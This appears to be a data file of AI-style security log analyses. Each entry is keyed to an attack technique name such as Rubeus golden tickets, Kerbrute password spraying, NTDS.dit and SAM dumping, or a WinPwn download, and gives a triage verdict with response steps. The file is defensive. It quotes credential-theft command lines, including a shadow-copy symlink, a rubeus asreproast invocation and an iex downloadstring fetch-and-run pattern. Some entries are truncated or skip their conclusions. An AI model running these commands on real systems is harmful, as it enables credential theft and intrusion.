4. **Process Ancestry**: The PowerShell and cmd.exe commands have a related lineage, indicating scripting or automation which may be part of an attack or unauthorized script being run by a user or attacker.

5. **Activity Timing**: The activity occurs in a sequential and rapid manner, suggesting automated script execution rather than manual user action.

**Assessment**:
The PowerShell command execution and its associated activities (stopping Chrome and accessing cookie data) are clear indicators of potentially unauthorized data access. The context suggests an active attack or malware executed within the environment aiming to collect and potentially exfiltrate sensitive information.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately isolate or disconnect the machine from the network to prevent further access or data exfiltration.
- Conduct a comprehensive malware scan and forensic investigation on the host to identify and remove any malicious software or scripts.
- Review user permissions and privileges, ensuring least privilege where possible to mitigate future risks.
- Alert and educate users about the suspected incident and reinforce security protocols, especially relating to suspicious email attachments or downloads.
- Implement monitoring for similar unauthorized activities across the network to preemptively detect such activities in the future."
Create Volume Shadow Copy remotely (WMI) with esentutl,"Based on the provided logs, let's analyze the events for potential indications of malicious activity or compromise.

### Application Log
The application logs show repeated VSS (Volume Shadow Copy Service) errors indicating `CoInitialize has not been called`. This might suggest issues with service initialization rather than direct malicious activity, but such errors could hint at interrupted backup processes potentially exploited by attackers.

### Security Log
There's an event (Event ID 4799) showing a caller `admin_test` using `esentutl.exe`, a legitimate tool for database utility operations, but often observed in attacks involving the manipulation or exfiltration of sensitive databases. The fact that it correlates with high-level privileges (`Administrators`, `Builtin`) suggests a higher risk if unauthorized. 

### Sysmon Log
Several Sysmon logs provide critical insights:

- **Event 5 Entries**: These logs record process access events. Multiple legitimate system processes (`wevtutil.exe`, `conhost.exe`, etc.) executed by `admin_test`, suggest standard operations. However:
  - Frequent use of `wevtutil.exe` and `cmd.exe` with commands/scripts involving `esentutl.exe` suggests an attempt at copying the Active Directory database file (`c:\\windows\\ntds\\ntds.dit`) to another directory (`c:\\ntds.dit`). This kind of operation is often associated with credential dumping activities.

- **Event 1 Entries**: Process creation events indicate:
  - `cmd.exe` creating a process to move the NTDS data indicates potential data exfiltration or credential dumping. The /vss switch with `esentutl.exe` helps in accessing files locked by the system (indicating a more stealthy, advanced method).

This activity, in concert with the `admin_test` account and the use of system utilities typically seen in attacks, raises substantial red flags.

### Windows PowerShell Log & System Log
There are no relevant entries found in the PowerShell and System logs that stand out as immediately suspicious.

### Conclusion and Resolution
The combination of these factors—especially the high privilege process executions, the potential access to credential stores, and the timing/concentration of these log events—suggest a significant risk of compromise.

#### Resolution: MALICIOUS
Given the actions and their typical use in credential dumping or unauthorized data replication scenarios, these logs indicate a potential compromise. Immediate remediation steps should include:

1. **Isolate the Host**: Temporarily remove `Server002` from the network to prevent lateral movement.
2. **User Review**: Investigate the activities of `admin_test`, check for known credentials, and ensure they have not been compromised.
3. **Analyze Artifacts**: Pull memory dumps, registry insights, and network connections for further investigation.
4. **Network Forensics**: Check for outbound connections that might indicate exfiltration.
5. **Audit Logs Continuously**: Implement stricter logging and alerts for similar activities to catch potential future occurrences.

Further thorough forensic examination is advised to understand the scope and impact fully."
Password Spray using Kerbrute Tool,"**Detailed Analysis**

Upon reviewing the provided logs across the Sysmon, Security, Windows PowerShell, and Application channels, we can identify several indicators of potentially malicious activity:

1. **Suspicious PowerShell Activity**:
   - A critical highlight is the execution of PowerShell with a command-line execution involving `kerbrute.exe` for password spraying (`kerbrute.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain`). This tool is typically used for brute force attacks against Kerberos, which poses a significant security threat as it attempts to exploit Active Directory authentication protocols.

2. **Process Execution**:
   - Multiple instances of system utilities like `wevtutil.exe`, `conhost.exe`, and others initiated by the `admin_test` user. While some of these are normal processes associated with system functions, the frequent and rapid execution alongside the suspicious power activity, suggests potential automated script execution or misuse.

3. **Security and Privilege Escalation Logs**:
   - There is a repeated query of user credentials, including privileged accounts (e.g., Administrator, admin_test). This activity is logged under multiple EventID 4798 entries, indicating a possible reconnaissance activity to enumerate available accounts and prepare for further exploitation.
   - Events 4672 log special privileges being assigned to SYSTEM processes, which in isolation may appear normal, but in conjunction with potentially malicious PowerShell scripts, raise concerns about privilege misuse.

4. **Credential Access Events**:
   - EventID 5379 logs indicate repeated attempts to obtain credentials related to ""MicrosoftAccount:user"". The ReturnCode indicates failure, but such actions could be part of an attempted access or brute force strategy.

**Assessment**

Given the context of the logs and the identified activities, the evidence leans towards potential malicious activity:
   
- **Presence of a password spraying tool like `kerbrute` executed through PowerShell** is a direct implication of an attack or breach attempt.
- The enumeration and credential queries across users, often alongside higher privileges assignment events, hint at intrusion stages consistent with lateral movement or privilege escalation in the network.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Actions**:
   - **Isolate the affected host**: Disconnect the server from the network to prevent further spread or data exfiltration.
   - **Preserve evidence**: Ensure logging remains untouched and collect current system state, volatile data, and logs for further forensics.
   - **Reset credentials**: Especially privileged accounts, to prevent further misuse.

2. **Investigate and Mitigate**:
   - Conduct a thorough forensic investigation to identify any additional compromised accounts or systems.
   - Review firewall and network logs to establish a trace of external connections or unusual activity.
   - Implement tighter PowerShell execution policies and monitor account activity closely.

3. **Long-term Measures**:
   - Enhance endpoint detection and response mechanisms to catch similar activities proactively.
   - Educate and train staff on identifying phishing and suspicious behavior to reduce the initial attack surface.
   - Regularly review and refine security policies around privileged access and usage of administrative utilities."
Dump Chrome Login Data with esentutl,"After analyzing the provided Sysmon logs, the following observations have been made:

1. **Unusual PowerShell Execution**: There is a record of `powershell.exe` being executed by the user `SERVER002\admin_test` (Event ID: 18004). PowerShell can be used maliciously to execute scripts, download payloads, or perform reconnaissance. It's worth noting that this entry alone is not indicative of malicious activity, as administrators often use PowerShell for legitimate purposes.

2. **Frequent use of `wevtutil.exe` and `conhost.exe`**: The logs show multiple instances of `wevtutil.exe` and `conhost.exe` being executed in rapid succession by the same user (`SERVER002\admin_test`). `wevtutil.exe` is a legitimate tool for managing event logs, and `conhost.exe` is associated with command prompt operations. While their execution in rapid succession can sometimes indicate log manipulation or other administrative tasks, there is no direct evidence in the logs to conclude malicious intent.

3. **Execution of `whoami.exe` and `hostname.exe`**: The commands `whoami.exe` (to retrieve user information) and `hostname.exe` (to retrieve system hostname) were run by the user `SERVER002\admin_test`. These commands are common for performing system checks and reconnaissance within a Windows environment but are not themselves inherently malicious.

4. **Suspicious Use of `esentutl.exe` via `cmd.exe`**: A potentially suspicious command is found where `cmd.exe` is leveraged to execute `esentutl.exe` with specific arguments targeting Google Chrome's user data (Event ID: 18034). This could indicate an attempt to copy or extract browser credentials or session data. The use of `esentutl.exe` to interact with browser data is anomalous and could potentially be a sign of credential theft or data extraction.

### Assessment:
- The command involving `esentutl.exe` is particularly suspicious due to its focus on accessing browser login data, which is uncommon for most legitimate administrative tasks. It could be suggestive of credential harvesting behavior.
- The frequent invocation of system utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`) might be part of routine or scripted administrative activities but combined with the PowerShell execution, could warrant further scrutiny.

### Conclusion:
**Resolution: SUSPICIOUS**

This activity requires further investigation, particularly around the execution of `esentutl.exe` and any PowerShell commands executed during the time period. It would be advisable to:
- Review PowerShell logs for any scripts or commands executed around this time.
- Check if other machines show similar patterns of `esentutl.exe` usage targeting browser data.
- Conduct a full malware and vulnerability assessment on the host `Server002`.
- Ensure proper logging and alerts are in place to catch similar patterns in the future."
Create Symlink to Volume Shadow Copy,"### Analysis of Windows Event Logs

Upon reviewing the provided Windows event logs from Server002, here is a detailed analysis based on various log sections:


1. **System Log**:
   - _Windows Update Events_: These logs showcase standard activities related to the update process for Microsoft Defender Antivirus. Events with IDs `43` and `44` denote updates being applied. 

2. **Sysmon Log**:
   - _Sysmon Event ID 5 (Process Termination)_ and _Event ID 1 (Process Creation)_: These entries document various processes like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` being executed by the user `SERVER002\admin_test`. Of particular note is the chain of processes leading to:
     - `cmd.exe` executing a shadow copy creation and directory junction via VSS (Volume Shadow Copy) and `mklink`. The command:
       ```
       cmd.exe /c vssadmin.exe create shadow /for=C: & mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
       ```
       This could potentially be a sign of suspicious activity, possibly indicative of data exfiltration techniques or setup for bypassing typical file access protections by shadow copying.
   
3. **Security Log**:
   - _Event ID 4624 (Logon Success)_: There are multiple successful logon events for `admin_test`. This user seems to have various privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.), which could potentially be abused for malicious activities.
   - _Event ID 5379_: Attempts to read system credentials (`ReturnCode 3221226021`) indicate failed operations, possibly benign but should be noted. 
   - _Event ID 4672 (Special Privileges Being Assigned)_: Assigning of high-level privileges to `admin_test` could be routine, but given the other activity observed, it merits further scrutiny.

### Assessment
The logs suggest potential misuse of elevated privileges by the user `admin_test`, particularly the articulated use of shadow copies and symbolic links with system commands. While some processes in these logs could be routine, the presence of elevation of privileges and execution of sensitive system commands is suspicious.

### Conclusion
- **Resolution:** **SUSPICIOUS**

### Guidance on How to Proceed:
- **Further Investigation:** 
  - Verify if `admin_test` is authorized to perform such operations.
  - Investigate any network activity from the IP addresses associated with recent logons.
  - Examine usage patterns and alert for any anomalous activities linked to `cmd.exe` and VSS operations.
- **Audit and Monitor:**
  - Monitor for any recurrence of shadow copy-related operations.
  - Review audit logs for any unexplained access to critical or sensitive files.
- **System Hardening:**
  - Limit administrative access and employ logging and monitoring on commands like VSS and `cmd.exe`.
- **User Awareness:**
  - Provide training on the implications of elevated privileges misuse. 

These steps should help in determining if there is ongoing malicious activity and in mitigating potential risks."
Rubeus asreproast,"Based on the provided logs, I conducted an analysis focusing on any suspicious behavior that might indicate malicious activity or compromise. Here's a step-by-step breakdown of my investigation:

### Application Log
1. **Windows Defender Status**
   - Multiple entries indicate Windows Defender is active and in the ""SECURITY_PRODUCT_STATE_ON"" state, suggesting it was operational during the events.

2. **edgeupdate Service**
   - There's a log indicating the ""edgeupdate"" service was stopped, which may be a routine event and isn’t inherently malicious unless combined with other suspicious activities.

### Sysmon Log
1. **PowerShell Execution**
   - Multiple instances of PowerShell being executed:
     - A PowerShell instance executing the command: 
       ```
       powershell.exe & {cmd.exe /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\rubeus.exe\"" asreproast /outfile:\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\rubeus_output.txt\""}
       ```
     - This is a clear indicator of a TTP (Tactics, Techniques, and Procedures) associated with credential dumping attacks, specifically Kerberos-related attacks using tools like ""Rubeus.""

2. **Command Line Execution**
   - A cmd.exe command is seen executing Rubeus for ""asreproasting,"" known to exploit known vulnerabilities in Kerberos to extract service tickets.

3. **System Integrity and Updates**
   - Normal behavior can be observed with Microsoft Edge updates and Windows updates, indicating the system was handling routine update processes.

### Windows PowerShell Log
- The logs provide additional context to the PowerShell events listed in the Sysmon logs and confirm the execution of the suspicious command.

### System and Security Logs
- Routine updates for Microsoft Defender are indicated; no direct security alerts related to the suspicious PowerShell activity are logged.

### Conclusion and Recommendation
- **Assessment:** The execution of the ""Rubeus.exe"" tool through PowerShell and command line arguments in the logs is highly indicative of malicious activity. This tool is commonly used for credential harvesting attacks in a Windows environment.
- **Resolution:** Based on the analysis of these events, the system appears to have been compromised with a focus on credential theft using ""Rubeus.""
  
### Resolution: MALICIOUS
Recommendation for further action:

Crafting Active Directory golden tickets with Rubeus,"Based on an analysis of the provided Windows event logs, there are strong indicators that suggest malicious activity on the host.

1. **Suspicious PowerShell Commands**: The PowerShell logs indicate the execution of a script that invokes `rubeus.exe` with the `golden` option and other parameters related to creating a Golden Ticket. Golden Tickets are a well-known method to forge Kerberos Ticket Granting Tickets, which allows attackers to gain unauthorized access across a domain. 
   
   - **Key Indicators**:
     - Invocation of `rubeus.exe` with `golden ticket` parameters.
     - Use of a specific AES256 encryption key, likely to forge Kerberos tickets.
     - Commands to purge Kerberos tickets (`klist purge`) and request access to SYSVOL.
     - The creation and execution of a batch file to prevent Kerberos ticket purge, indicative of a sophisticated attack to persistently authenticate as a domain user.

2. **Sysmon and Security Logs**: The Sysmon logs contain entries for `cmd.exe`, `runas.exe`, `klist.exe`, and `rubeus.exe`, all originating from or orchestrated by `powershell.exe`. These tools are often used in lateral movement, privilege escalation, and persistence within compromised environments.
   
   - Repeated instances of suspicious command-line executions, such as:
     - `cmd.exe /c rubeus.exe golden ...`
     - `runas.exe /netonly /user:fake ...`
     - `klist purge`
   
   - The logs also record privileged access being granted (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.), which could be leveraged by an attacker to gain further control over the system or network.

3. **Security Auditing Logs**: The security logs show evidence of potential credential theft or misuse, as indicated by the error return codes in `EventID 5379`, which signals issues with credential requests. Furthermore, repeated logging of privileged access and user enumeration (`EventID 4798`) suggest reconnaissance post-compromise.

### Assessment and Resolution:

- Given the combination of sophisticated PowerShell scripts aimed at Kerberos ticket manipulation, the presence of hacking tools like `rubeus.exe`, and specific system commands intended for credential theft or privilege escalation, the activity observed can be confidently classified as **MALICIOUS**.

### Guidance on How to Proceed:

1. **Containment**: Immediately isolate the affected host from the network to prevent further spread of the attack.
  
2. **Eradication and Recovery**: 
   - Remove and rebuild the compromised system from a known clean backup.
   - Change all potentially compromised credentials and consider a full password reset across the affected domain.
   - Monitor other hosts in the network for similar indicators of compromise.

3. **Investigation and Remediation**:
   - Conduct a thorough forensic investigation to understand the scope of the breach and entry point.
   - Implement enhanced security measures, such as advanced logging, enhanced monitoring, and regular auditing of privilege use across systems.

4. **Review and Strengthening Policies**:
   - Review security policies, particularly those related to access control, password policies, and auditing.
   - Train staff on recognizing signs of compromise and suspicious activity.

Given the severity and potential impact of a successful Golden Ticket attack, immediate action is warranted to protect the integrity of the domain and mitigate further risk."
Password Cracking with Hashcat,"After reviewing the provided Windows event logs, several details suggest potentially malicious or at least suspicious activities that warrant further investigation:

1. **Execution of Hashcat (Potential Malicious Activity):**
   - The Sysmon log entries indicate usage of `hashcat.exe`, a well-known password recovery tool, by the user `admin_test`. The specific command-line argument indicates that it is being executed from a temporary directory, which is unorthodox for legitimate use. Typically, hashcat would not be found in such directories unless explicitly placed there for unauthorized purposes.
   - Events show the process parented by `wsmprovhost.exe`, indicating this operation might be leveraging PowerShell or another remote execution vector.

2. **Frequent Use of System Utilities in a Short Time Frame:**
   - The logs capture frequent execution of various system utilities such as `cmd.exe`, `conhost.exe`, `wevtutil.exe`, and others within seconds of each other. This behavior is atypical in a standard operational context and could suggest automated or scripted activity, commonly seen in malicious operations.
   - Additionally, `wevtutil.exe` is known for event log manipulation, raising additional flags.

3. **Suspicious Network Account Access Events:**
   - The logs show repeated EventID 5379 entries with failed credential activities against `MicrosoftAccount:user=02txoixylodcstop`. While no credentials were successfully returned (Return Code 3221226021 indicates a ""User not found or unauthorized"" failure), the persistence of these attempts over a short period is suspicious and would be significant if coupled with unsanctioned data access or manipulation.

4. **Privilege Activities and Administrative Group Enumeration:**
   - Several EventID 4672 entries show that the `SYSTEM` account is being granted special privileges. Although typical for system processes, in conjunction with other suspicious logs, it might suggest elevated activities at play.
   - EventID 4798 logs capture enumerations of the Administrator and other accounts by the process `taskhostw.exe`, which can be correlated with information gathering for privilege escalation.

5. **Indicators of Potential Exploitation:**
   - High integrity level and system-level activities with `NT AUTHORITY\SYSTEM` and tools like `rundll32.exe` and `taskhostw.exe` interacting with typical services can suggest closer scrutiny, especially with potential attempts to evade defenses or system tampering.

**Assessment:**
Based on these observed behaviors, the activities are SUSPICIOUS and warrant deeper investigation, notably into the context of `hashcat.exe` usage, especially its origin, and the purpose of such activity. It is advisable to check if this was legitimate testing or an unsanctioned attempt to crack hashes. Coupled with the possibility of a privilege escalation attempt and the timing of events, it is crucial to review subsequent incidents or correlating activities that might confirm a security breach.

**Resolution:**
- **SUSPICIOUS**: Further investigation is required to ascertain the legitimacy and intent behind these activities. Immediate steps should include:
  - Isolating the machine from the network to prevent potential lateral movement.
  - Conducting a thorough audit of recent activities and changes by `admin_test`.
  - Verifying the integrity of system services and data potentially accessed.
  - Enhancing monitoring around similar usage patterns to preempt potential threats."
Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos),"Upon analyzing the provided Windows event logs, I have identified several indicators of potentially malicious activity. Here is a detailed analysis:

### Indicators of Potential Malicious Activity:

1. **Time Change Events (System Log and Security Log):**
   - `EventID: 1` and `EventID: 4616` show time changes on `Server002`. Frequent and unauthorized time changes may indicate an attempt to manipulate time-based services or logs, which could be suspicious if not scheduled or authorized.

2. **PowerShell Script Execution (Windows PowerShell Log and Sysmon Log):**
   - A PowerShell script was executed with commands characteristic of **password spraying** attacks. The command line indicates attempts to authenticate user accounts using a known password (`P@ssw0rd!`), which is a common tactic for attackers trying to gain unauthorized access.
   - The presence of commands such as `Get-ADUser` and LDAP connections with possible account credential attempts (`Write-Host \"" [-] Attempting ${password} on account ${user}.\""`) are indeed suspicious.

3. **Process Creation Events (Sysmon Log):**
   - Sysmon logs reveal that PowerShell (`powershell.exe`) and related processes like `conhost.exe` were run under a user context (`SERVER002\\admin_test`), and executed scripts aimed at account enumeration and potential credentials cracking.

Given the context of the logs, the execution of a PowerShell script with components aimed at testing common admin credentials across user directories suggests a high probability of malicious intent. These PowerShell activities align with known techniques of lateral movement and user credential harvesting by threat actors.

### Conclusion

**Resolution: MALICIOUS**

The analysis of the logs highlights a significant risk of compromise on Server002, with evidence of a password spraying attack likely being executed using PowerShell. This activity aligns with known tactics used to compromise systems or escalate privileges within a network. 

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - **Isolate the System:** Disconnect Server002 from the network to prevent further data exfiltration or lateral movement.
   - **Alert Incident Response Team:** Engage your incident response team to further investigate the breach and assess the scope of the attack.

2. **Further Investigation:**
   - **Analyze Other Hosts:** Check for similar patterns or connections initiated from or to other hosts.
   - **Review Access Logs:** Investigate authentication logs for anomalies or unauthorized access attempts.

3. **Preventive Measures:**
   - **Update Security Policies:** Adjust PowerShell execution policies to restrict script execution.
   - **Consider Multi-Factor Authentication:** Implement multi-factor authentication (MFA) to add an extra layer of security.

4. **Reinforcement of Security Measures:**
   - **Regularly Update and Patch Systems:** Ensure all systems, especially those exposed to potential threats, are up to date with the latest security patches.
   - **Enhance Monitoring and Logging:** Improve the logging of events and setup alerts for suspicious activities, especially focusing on PowerShell activities and unauthorized time changes.

By taking these steps, the organization can mitigate the current risk and better prepare its defenses against future attacks."
dump volume shadow copy hives with certutil,"## Detailed Log Analysis and Findings:

### General Observations:

1. **Applications and Processes:**
   - Various system processes were initiated, including standard OS utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, and `certutil.exe`. While some of these processes are legitimate utilities generally used for system administration, they can also be used with malicious intent.

2. **Command Utilization:**
   - Usage of `certutil.exe` might be legitimate in some contexts but can be leveraged by adversaries for malicious activities, notably in data exfiltration or decoding operations. 

3. **Command-Line Arguments:**
   - A suspicious command line with `cmd.exe` shows a loop leveraging `certutil` to encode files from volume shadow copies, encoding the Windows SAM database into temporary files (`SAMvss*`) through `certutil` using the `-encodehex` function. This is an unusual and suspicious activity often associated with attempts to access or exfiltrate sensitive data, like password hashes.

### Suspicious Activities:

- **File System Interaction:**
  - The method of enumerating and encoding system volume shadow copies via `certutil`, as found in logs, is a typical red flag for data gathering or preparation for data exfiltration.

- **Process Chains and Parent/Child Relationships:**
  - Noteworthy connections in parent-child processes involving `cmd.exe` and `certutil.exe`, stemming from administrative users suggest unauthorized activities.
  
- **Context of Operations:**
  - All suspicious commands executed by `SERVER002\admin_test` with high integrity levels indicate potentially unauthorized accessibility from an admin account, exploiting legitimate system processes for possibly malicious purposes.

### Indications of Malicious Activity:
  
- The behavior indicates potential credential dumping or reconnaissance with malicious intent, particularly due to the involvement of the SAM database directories and the use of `certutil` to encode copies of it.
  
### Conclusion and Assessment:

Based on the following suspicious behaviors:

- Use of `certutil.exe` in an abnormal context.
- Looped execution of potentially sensitive data copying commands.
- Manipulation of system utilities in excess often aligning with security breaches.

   - Isolate the involved host (`Server002`) from the network to prevent potential data exfiltration.
   - Conduct a thorough forensic analysis to determine the extent of the breach and identify any unauthorized access or backdoors.

2. **Access Review:**
   - Review access logs and permissions for the account `admin_test`.
   - Investigate any irregular use of administrative credentials and enforce password changes.

3. **System and Network Hardening:**
   - Implement stricter monitoring of administrative tools usage.
   - Develop automated alerts for similar suspicious behavior patterns.

4. **User Education:**
   - Conduct awareness sessions for users with elevated privileges about the risks of such exposures and proper practices for the use of administrative tools. 

By following these steps, the system's integrity can be restored, and future occurrences can be mitigated effectively."
Dump Credential Manager using keymgr.dll and rundll32.exe,"### Analysis of Windows Event Logs

#### Observations:

1. **Security Log Events:**
   - **Event ID 4624 & 4672: Logon Success and Special Privileges**
     - Multiple successful logon events using NTLM authentication with Logon Type 3 (network) for the user `admin_test`. The privileges include powerful privileges like SeDebugPrivilege, SeLoadDriverPrivilege, and SeImpersonatePrivilege, which are often targeted for misuse in attacks.
   - **Event ID 5379: Credential Manager**
     - The event indicates an attempt to read cached credentials using the Credential Manager API, which failed (ReturnCode: 3221225567). Failed access to credential management could suggest suspicious behavior if not normally expected in routine operations.

2. **Sysmon Log Events:**
   - **Event ID 5 & 1: Process Creation**
     - Usage of `wevtutil.exe` together with `conhost.exe` by admin_test repeatedly over a short timeframe. `wevtutil` is a legitimate tool used for managing Windows Event logs but can be used maliciously to clear or alter logs to cover tracks.
     - Execution of `powershell.exe` with the command `rundll32.exe keymgr,KRShowKeyMgr`. This command can be suspicious as `rundll32.exe` combined with lesser-used functionalities might indicate Living Off the Land Binaries (LOLBins) tactics.
   - **`hostname.exe` and `whoami.exe`:** These utilities were executed but do not inherently indicate malicious activity, though they may be used to gather system information during reconnaissance activities.

3. **PowerShell Log Events:**
   - PowerShell was executed with the application referencing `rundll32.exe keymgr,KRShowKeyMgr`. This aligns with Sysmon observations and the known capability of Credential Manager (keymgr.dll) to interact with stored credentials and sessions.

4. **Application Log Event:**
   - An `HHCTRL` related information-level event indicates a connection or redirection related to Microsoft URLs, which in isolation does not indicate malicious behavior.

#### Assessment:

The combination of powerful privileges being granted on successful logins, the repeated and quick succession of utilizing `wevtutil.exe` for task-oriented actions that also involve `conhost.exe`, and the specific use of PowerShell with `rundll32.exe` in an atypical manner are red flags.

- **The log entries indicate that an admin user is executing tasks that attempt to manipulate system credentials and potentially alter event logs, a significant indicator of potential compromise.**
- **The activities specifically around usage of NTLM and elevated privileges further imply attempts consistent with later stages of the kill chain, possibly persistence or data exfiltration.**

#### Guidance:

Given the findings and patterns observed in the log events, there is a strong suggestion of unauthorized, potentially malicious behavior:
- **Resolution: MALICIOUS**

**Next Steps:**
1. **Containment:**
   - Isolate the affected host from the network to prevent any lateral movement.
2. **Investigation:**
   - Conduct a full forensic analysis of the server for additional indicators of compromise.
   - Audit user accounts, especially those with administrative privileges.
3. **Remediation:**
   - Reset credentials, particularly for the `admin_test` account if authorized use is not confirmed.
   - Review and secure the configuration of privileged accounts.
   - Implement additional monitoring and alerting for unusual use of elevated privileges and NTLM authentication.

4. **Recovery:**
   - Restore systems from a known good backup, if necessary, after cleaning the affected environment.
5. **Preventive Measures:**
   - Introduce multi-factor authentication for privileged accounts.
   - Enhance logging and audit policies to capture detailed usage of command-line tools."
WinPwn - Loot local Credentials - mimi-kittenz,"Upon analyzing the provided event logs, several observations can be made:

### Observations:

1. **System Log:**
   - The logs include standard system activities like time synchronization and service notifications, which in themselves do not indicate any malicious activities.
   - The time adjustment logs by `svchost.exe` are likely to be part of regular time synchronization activities involving time.windows.com.

2. **Application Log:**
   - Windows Defender indicates its security state as active, suggesting that the machine has protection enabled.
   - Routine services such as the `edgeupdate` service being stopped are normal system or application maintenance operations.

3. **Windows PowerShell Log:**
   - There is a suspicious PowerShell command that retrieves and executes a script from a GitHub repository called ""S3cur3Th1sSh1t/WinPwn"". This activity is highly suspicious because:
     - PowerShell is used to download and execute script content from an external source.
     - The repository name and file suggest the possibility of penetration testing or offensive security tools being executed.
   - The presence of this command is a strong indicator of attempted script-based exploitation or penetration testing activities on the host.

4. **Sysmon Log:**
   - Execution of utilities like `whoami.exe`, `hostname.exe`, `conhost.exe` are typical behaviors but may be used in conjunction with malicious PowerShell scripts to gain further system information.
   - Presence of legitimate processes (`wevtutil.exe`, `conhost.exe`) running under a user account `SERVER002\admin_test` is not inherently suspicious unless correlated with other malicious activities.
   - The combination of PowerShell executions as seen in the logs coupled with Sysmon logs indicating use of system tools increases the likelihood of potential malicious activity.

5. **Security Log:**
   - Security events like time change records are legitimate and are managed by the `svchost.exe` process without any signs of compromise.
   - No explicit privilege escalation or unauthorized logins were detected in these logs.

### Assessment:

Based on the analysis, the logs indicate the following:

- The execution of PowerShell with external content download and execution, especially from a repository known for offensive tools, raises a serious red flag.
- Such behavior is often associated with malware delivery or exploitation frameworks, notably if these activities are unapproved or not part of authorized testing operations.

### Conclusion:

**Resolution: MALICIOUS**

- The activities observed, especially the use of PowerShell to download and execute a script from a GitHub repository, strongly suggest malicious intent or at the very least unauthorized security testing.
  
### Guidance:

1. **Immediate Action:**
   - Investigate the context and purpose of the executed PowerShell scripts.
   - Ensure that the machine is disconnected from any critical networks to prevent potential spread or damage.
   - Validate with the IT/security team if this activity is part of an authorized security assessment.

2. **Remediation Steps:**
   - Suspend and scrutinize any unnecessary administrative credentials such as `admin_test` to mitigate risk.
   - Conduct a thorough malware scan using an updated antivirus or endpoint detection solution.
   - Review and enhance PowerShell logging and script controls to detect and block such unauthorized actions in the future.

3. **Follow-up:**
   - Analyze all machines within the same network segment for similar activities.
   - Provide additional security awareness training to users regarding the risks of unauthorized PowerShell script execution."
WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes,"### Analysis

#### Security Log
The security logs are filled with Event ID 5379 entries, indicating attempted credential reads that returned with the error code 3221226021 (which translates to STATUS_NO_SUCH_LOGON_SESSION). This behavior can sometimes suggest inappropriate or unauthorized attempts to access credentials, but as these attempts merely failed and are on their own typical of certain automated processes or misconfigurations, they are not alone indicative of malicious behavior. Further investigation could be warranted.

#### Windows PowerShell Log
The PowerShell logs reveal a significant red flag. An instance of PowerShell was running with the command line that involved execution of a script downloaded from the `S3cur3Th1sSh1t` repository on GitHub. The script `WinPwn.ps1` and the usage of `iex(new-object net.webclient).downloadstring(...)` pattern is often associated with malicious activity, specifically with downloading and executing code directly from the internet which can be highly risky. This instance suggests a potential compromise or at the very least suspicious behavior that needs further investigation.

#### Application Log
The Application logs show normal activity with Windows Defender being active (SECURITY_PRODUCT_STATE_ON). There are no specific alerts or malware detections reported in these logs.

#### Sysmon Log
The Sysmon logs reveal several process creations by the user `SERVER002\admin_test` involving processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `PowerShell.exe`. The key point of interest here is the PowerShell process which correlates with what was seen in the PowerShell log, running with the direct download and execution command.

#### System Log
The System log entries appear to contain normal Windows Update activities for the system, such as updating the Microsoft Defender Antivirus. Updates were applied successfully, and there are no signs of disruptions or failures tied to problematic software.

### Assessment
The PowerShell activity of concern shows a script being downloaded and executed from an external source, which is a classic indicator of potential threat actor activity. This method aligns with commonly seen behaviors in malicious practices where attackers leverage PowerShell scripts to conduct system reconnaissance or deploy backdoors. Moreover, this fits a profile for administrative scripts being run to execute unauthorized actions. 

### Conclusion: MALICIOUS

### Guidance
1. **Immediate Containment:** Isolate the server from the network to prevent any active threats from spreading.
2. **Detailed Investigation:** Perform a thorough investigation to determine the extent of the compromise. Check for other scripts execution or any saved scripts under the user's directories, and inspect network logs for data exfiltrations.
3. **Security Enhancements:** Review and enhance PowerShell logging and execution policies, potentially disabling the internet-access for PowerShell scripts unless duly signed.
4. **Review Access:** Analyze access controls, particularly focusing on the `admin_test` account and any other administrative accounts for unauthorized access attempts.
5. **Patch & Update:** Ensure all systems and antivirus software are fully patched and updated.
6. **User Education:** Educate users on the dangers of executing unverified scripts and establish strict protocols for scripting and administrative activities."
Simulating access to Windows Edge Login Data,"**Detailed Analysis:**

Upon reviewing the provided Windows event logs, several observations can be made regarding potential indicators of malicious activity:

1. **PowerShell Activity:**
   - There are multiple entries related to PowerShell execution on the machine `Server002`. 
   - The PowerShell command being executed is: 
     ```powershell
     powershell.exe & {Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\Edge"" -Force -Recurse}
     ```
   - This command copies the Edge browser's user data to a different location (`..\Externalfiles\Edge`) on the system, which can be indicative of data exfiltration or preparation for further malicious actions. 

2. **Sysmon Logs:**
   - The PowerShell activity is corroborated by Sysmon entries showing the process `powershell.exe` being executed by the user `SERVER002\admin_test`.
   - Other processes such as `wevtutil.exe`, `whoami.exe`, and console hosts `conhost.exe` were also noted. While these are legitimate processes, their timing in close proximity to suspicious PowerShell activity can be suspicious, particularly `wevtutil.exe`, which is used for event log management and could signify log clearance attempts.
    
3. **Absence of Security Log Events:**
   - The security logs are conspicuously devoid of entries, which may indicate potential tampering or clearing of logs. This would align with malicious behavior, attempting to cover tracks.

4. **Application Log:**
   - The entry related to the `Software Protection Platform Service` and an Edge update service stopping doesn't directly suggest malicious activity but occurs around the same window of time as other suspicious events.

**Assessment:**

Given the findings, there is compelling evidence suggesting suspicious activities, mainly focused on the unexpected use of a PowerShell command to copy browser user data, potentially indicating data exfiltration or credential theft attempts. The absence of security logs and recent `wevtutil.exe` activity also raises concerns about potential log tampering, commonly associated with breach attempts to erase traces.

**Conclusion:**

- **Resolution:** SUSPICIOUS

**Guidance on How to Proceed:**

1. **Immediate Investigation:**
   - Isolate the host `Server002` from the network to prevent further data exfiltration.
